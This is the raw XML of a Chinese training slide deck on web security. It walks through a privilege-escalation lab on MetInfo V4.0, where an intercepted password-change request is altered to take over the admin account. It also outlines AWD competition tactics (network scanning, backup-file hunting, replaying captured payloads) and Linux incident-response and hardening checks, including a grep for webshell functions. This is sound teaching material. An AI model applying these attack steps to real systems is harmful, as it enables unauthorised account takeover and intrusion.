              <a:chExt cx="2596954" cy="4053937"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="10" name="TextBox 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440903" y="3635604"/>
                <a:ext cx="2596952" cy="234355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应用程序对用户权限校验不严格，导致用户可以访问或操作超出其权限范围的资源。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440901" y="2617258"/>
                <a:ext cx="259694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越权漏洞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440902" y="1925223"/>
                <a:ext cx="259694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154146" y="1925223"/>
              <a:ext cx="2596954" cy="4208876"/>
              <a:chOff x="6154146" y="1925223"/>
              <a:chExt cx="2596954" cy="4208876"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="14" name="TextBox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154148" y="3635603"/>
                <a:ext cx="2596952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同级别用户之间可以相互访问资源，如普通用户A可以查看或修改用户B的数据。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154146" y="2617258"/>
                <a:ext cx="259694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水平越权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154147" y="1925223"/>
                <a:ext cx="259694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867390" y="1925223"/>
              <a:ext cx="2596954" cy="4208877"/>
              <a:chOff x="8867390" y="1925223"/>
              <a:chExt cx="2596954" cy="4208877"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="18" name="TextBox 1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867392" y="3635604"/>
                <a:ext cx="2596952" cy="24984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低权限用户可以执行高权限用户的操作，如普通用户可以访问管理员专属功能或修改管理员密码。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867390" y="2617258"/>
                <a:ext cx="2596949" cy="101834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垂直越权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867391" y="1925223"/>
                <a:ext cx="2596949" cy="49083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lnSpc>
                    <a:spcPct val="99000"/>
                  </a:lnSpc>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" sz="2600" b="1" i="0">
                    <a:solidFill>
                      <a:srgbClr val="43D0B1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知识点核心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逻辑漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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6" y="2362200"/>
            <a:ext cx="12095807" cy="2822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7080" y="1600200"/>
            <a:ext cx="7991475" cy="4191000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="c3d57105-6a33-470a-b403-67c702043e50"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660400" y="1130300"/>
            <a:ext cx="6463665" cy="4999990"/>
            <a:chOff x="660400" y="1130299"/>
            <a:chExt cx="10864850" cy="4999969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299"/>
              <a:ext cx="10858500" cy="585431"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1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>
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>metinfo</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> V4.0 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>垂直越权实验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4" name="AutoShape 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="666750" y="1715730"/>
              <a:ext cx="10858500" cy="4414538"/>
            </a:xfrm>
            <a:prstGeom prst="plaque">
              <a:avLst>
                <a:gd name="adj" fmla="val 0"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF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886619" y="1881185"/>
              <a:ext cx="5105400" cy="1268597"/>
              <a:chOff x="886619" y="1881185"/>
              <a:chExt cx="5105400" cy="126859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263651" y="1881185"/>
                <a:ext cx="4728368" cy="3882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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" b="1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步骤一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63651" y="2269449"/>
                <a:ext cx="4728368" cy="8803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准备两个不同权限账号</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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例：注册一个普通用户</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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用户名abcd，密码123456</a:t>
                </a:r>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="14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20000"/>
                  </a:lnSpc>
                  <a:defRPr/>
                </a:pPr>
                <a:endParaRPr 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86619" y="1896870"/>
                <a:ext cx="372270" cy="356895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886619" y="3295609"/>
              <a:ext cx="5105400" cy="1268597"/>
              <a:chOff x="886619" y="3295609"/>
              <a:chExt cx="5105400" cy="126859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263651" y="3295609"/>
                <a:ext cx="4728368" cy="3882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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1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步骤二</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100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63651" y="3683873"/>
                <a:ext cx="4728368" cy="8803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抓取高权限操作请求（如修改密码、查看数据）</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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例：登录该用户，进入页面后，修改其密码为123。</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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br>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0"/>
                </a:br>
                <a:endParaRPr lang="en-US" sz="11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86619" y="3311294"/>
                <a:ext cx="372270" cy="356895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86619" y="4710032"/>
              <a:ext cx="5105400" cy="1268597"/>
              <a:chOff x="886619" y="4710032"/>
              <a:chExt cx="5105400" cy="1268597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263651" y="4710032"/>
                <a:ext cx="4728368" cy="3882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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" b="1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步骤三</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100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63651" y="5098296"/>
                <a:ext cx="4728368" cy="8803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0000"/>
                  </a:lnSpc>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr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修改请求中的身份标识</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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00000"/>
                  </a:lnSpc>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr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例：修改密码的同时，对其进行抓包，将abcd改为admin</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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6619" y="4725717"/>
                <a:ext cx="372270" cy="356895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199981" y="1881185"/>
              <a:ext cx="5105400" cy="1268597"/>
              <a:chOff x="6199981" y="1881185"/>
              <a:chExt cx="5105400" cy="1268597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577013" y="1881185"/>
                <a:ext cx="4728368" cy="3882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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1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步骤四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577013" y="2269449"/>
                <a:ext cx="4728368" cy="8803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buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr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替换为低权限账号的身份标识</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr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例：这时候去登录管理员账号admin，密码123，成功登录后台</a:t>
                </a:r>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p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199981" y="1896870"/>
                <a:ext cx="372270" cy="356895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199981" y="3295609"/>
              <a:ext cx="5105400" cy="1268597"/>
              <a:chOff x="6199981" y="3295609"/>
              <a:chExt cx="5105400" cy="1268597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77013" y="3295609"/>
                <a:ext cx="4728368" cy="3882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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" b="1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判断标准</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100" dirty="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77013" y="3683873"/>
                <a:ext cx="4728368" cy="8803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buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr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成功 → 存在越权漏洞</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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buClrTx/>
                  <a:buSzTx/>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" sz="120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失败 → 权限校验正常</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="120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99981" y="3311294"/>
                <a:ext cx="372270" cy="356895"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 0"/>
                </a:avLst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实验结合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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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Linux应急响应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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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当Linux服务器遭受入侵或存在可疑行为时，通过一系列技术手段进行排查、分析和处置，以恢复系统安全。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6e18ec2-eb76-4b5a-afc5-9bbcf3ed8bbf"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr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3" name="Group 3"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="660400" y="2148654"/>
              <a:ext cx="3385345" cy="1811994"/>
              <a:chOff x="660399" y="2101850"/>
              <a:chExt cx="3560233" cy="1905602"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="4" name="AutoShape 4"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId2"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="767993" y="2698750"/>
                <a:ext cx="3452639" cy="49892"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B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TextBox 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400" y="2101850"/>
                <a:ext cx="596900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17298" y="2101850"/>
                <a:ext cx="2903334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定义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399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发现并处置Linux系统入侵痕迹，是保障服务器安全的重要运维操作。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403016" y="2148654"/>
              <a:ext cx="3385345" cy="1811994"/>
              <a:chOff x="660399" y="2101850"/>
              <a:chExt cx="3560233" cy="1905602"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="AutoShape 9"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId6"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="767993" y="2698750"/>
                <a:ext cx="3452639" cy="49892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TextBox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60400" y="2101850"/>
                <a:ext cx="596900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317298" y="2101850"/>
                <a:ext cx="2903334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日志分析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60399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重点检查 `/var/log/auth.log` (Ubuntu/Debian) 或 `/var/log/secure` (CentOS/RHEL) 中的SSH登录记录，寻找异常IP或频繁失败的登录尝试。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8133555" y="2148654"/>
              <a:ext cx="3385345" cy="1811994"/>
              <a:chOff x="660399" y="2101850"/>
              <a:chExt cx="3560233" cy="1905602"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="14" name="AutoShape 14"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId10"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="767993" y="2698750"/>
                <a:ext cx="3452639" cy="49892"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B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TextBox 1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60400" y="2101850"/>
                <a:ext cx="596900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317298" y="2101850"/>
                <a:ext cx="2903334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进程排查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60399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查看当前运行的进程，寻找占用资源异常或名称可疑的进程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100" dirty="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60399" y="1130300"/>
              <a:ext cx="10858500" cy="56757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Linux应急响应的常见检查点</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1100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979674" y="4322106"/>
              <a:ext cx="3385345" cy="1811994"/>
              <a:chOff x="2047827" y="2101850"/>
              <a:chExt cx="3560233" cy="1905602"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="20" name="AutoShape 20"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId14"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2155421" y="2698750"/>
                <a:ext cx="3452639" cy="49892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2047828" y="2101850"/>
                <a:ext cx="596900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2704726" y="2101850"/>
                <a:ext cx="2903334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后门检测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2047827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检查定时任务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(`crontab -l`、`/</a:t>
                </a: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etc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/crontab`)、</a:t>
                </a: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SSH授权密钥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(`~/.ssh/</a:t>
                </a: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authorized_keys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`) </a:t>
                </a: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和系统启动项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(`/</a:t>
                </a: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etc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/rc.local`、`</a:t>
                </a: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systemctl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list-unit-files`)。</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100" dirty="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724673" y="4322106"/>
              <a:ext cx="3385345" cy="1811994"/>
              <a:chOff x="3101993" y="2101850"/>
              <a:chExt cx="3560233" cy="1905602"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="25" name="AutoShape 25"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId18"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3209587" y="2698750"/>
                <a:ext cx="3452639" cy="49892"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B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TextBox 2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3101994" y="2101850"/>
                <a:ext cx="596900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3758892" y="2101850"/>
                <a:ext cx="2903334" cy="5969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文件完整性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3101993" y="2748642"/>
                <a:ext cx="3560233" cy="12588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`find` </a:t>
                </a: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命令按时间、权限查找近期被修改的文件，校验关键系统文件的完整性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100" dirty="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知识点核心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1356853" y="-296"/>
            <a:ext cx="9465596" cy="14843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AWD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="32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攻防对抗赛</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" b="1" i="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF">
                  <a:alpha val="100000"/>
                </a:srgbClr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pic>
        <p:nvPicPr>
          <p:cNvPr id="2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945" y="1752600"/>
            <a:ext cx="8233410" cy="4293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awd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" alt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攻防演练比赛收获</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1" i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562600" y="1219200"/>
            <a:ext cx="6134735" cy="442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由于大家的初始环境相同，找到一个漏洞即意味着拿下了所有尚未修补该漏洞的队伍。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8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信息收集与弱口令探测：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="18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 C 段：使用 nmap -sn 192.168.x.0/24 或 masscan 快速发现存活主机与开放端口 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目录扫描：使用 dirsearch 寻找备份文件（如 .git、.svn、www.zip），从中获取源码或配置信息 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漏洞快速定位与利用：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="18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审计配置文件：重点查看 config.php、database.php 等文件，寻找连接数据库的明文密码（可能通用）。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通杀漏洞挖掘：优先寻找 SQL 注入、任意文件上传/读取、命令执行等能直接获取 Flag 的高危漏洞。一旦确认利用方式，立即编写自动化脚本 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抓取流量与"反打" ：如果暂时找不到漏洞，可以利用 tcpdump 或 BurpSuite 抓取访问本队服务器的 HTTP 流量。分析对手攻击你的 Payload，稍作修改即可变成你攻击别人的利器 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81000" y="1219200"/>
            <a:ext cx="4999990" cy="512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先备份，再加固；先保证服务不宕机，再考虑其他操作。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8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源码与数据库备份：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登录服务器后第一件事就是备份。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源码：tar -zcvf /tmp/web_backup.tar.gz /var/www/html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数据库：mysqldump -u root -p --all-databases &gt; /tmp/db_backup.sql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将备份文件下载到本地或传输到远程服务器，防止被对手删库跑路 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/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="18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弱口令与权限修改：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" b="1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口令：立即修改 SSH、MySQL、后台管理员等所有默认口令，使用强密码 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权限：将 Web 目录权限设置为只读（如 chmod -R 555 /var/www/html），防止被写入 Webshell；上传目录（如 upload）取消脚本执行权限 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8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快速查杀后门：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出题方通常会在源码中预埋后门或通用漏洞。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工具：使用 D盾、Seay、河马等工具对下载的源码进行扫描，根据扫描结果直接注释或删除后门代码 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命令：find /var/www/html -name "*.php" | xargs grep -n "eval(\|assert(\|system(" 查找可疑函数 。</a:t>
            </a:r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sz="1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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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200" b="1" i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心得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1356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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信息收集是基础：无信息不渗透，前期收集越充分，后续攻击面越广。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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漏洞理解在动手：SQL注入、文件包含、XSS等漏洞，亲手复现后才能真正掌握原理。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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攻防思维要兼备：既要懂如何攻击，也要会应急响应，二者结合才是完整的安全视角。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0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endParaRPr lang="en-US" sz="11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092200"/>
            <a:ext cx="10858500" cy="20962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999672" y="5420282"/>
            <a:ext cx="6179954" cy="34551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2999672" y="5788582"/>
            <a:ext cx="6179954" cy="34551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3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4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5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6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7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8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9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10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11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12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13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14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15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16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17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18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19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0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1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2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3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4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5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6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7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8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29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30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31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32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33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34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35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36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37.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:381.1059842519685,&quot;left&quot;:49.631181102362206,&quot;top&quot;:89,&quot;width&quot;:859.737716535433}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3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4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7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1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2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3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4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5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6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7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8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59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0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1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2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3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4.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:394.00007874015745,&quot;left&quot;:51.999921259842516,&quot;top&quot;:89,&quot;width&quot;:855}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag65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66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67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68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69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0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1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2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3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4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5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6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7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8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79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80.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:393.9999212598425,&quot;left&quot;:51.999921259842516,&quot;top&quot;:89.00015748031495,&quot;width&quot;:855}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag8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8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8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84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8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8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87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8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8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9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9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9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9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94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95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96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97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98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99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00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01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02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03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04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05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06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07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08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09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10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11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12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13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14.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_DIAGRAM_VIRTUALLY_FRAME" val="{&quot;height&quot;:394,&quot;left&quot;:51.999921259842516,&quot;top&quot;:89,&quot;width&quot;:855.0000787401575}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag115.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="commondata" val="eyJoZGlkIjoiNmJhNGU0YTA1MGE2OWE1NWUxNWZjNDcwN2JmZDAxY2YifQ=="/>
</p:tagLst>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="1e735b74-07d5-4fdd-8879-6c9c31d6d6f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4011</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>441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等线</vt:lpstr>
      <vt:lpstr>1e735b74-07d5-4fdd-8879-6c9c31d6d6f1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mm</cp:lastModifiedBy>
  <cp:revision>33</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2006-08-16T00:00:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-16T00:00:36Z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D96A61D1D05B4DE883484C33B043773D_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.16929</vt:lpwstr>
  </property>
</Properties>
</file>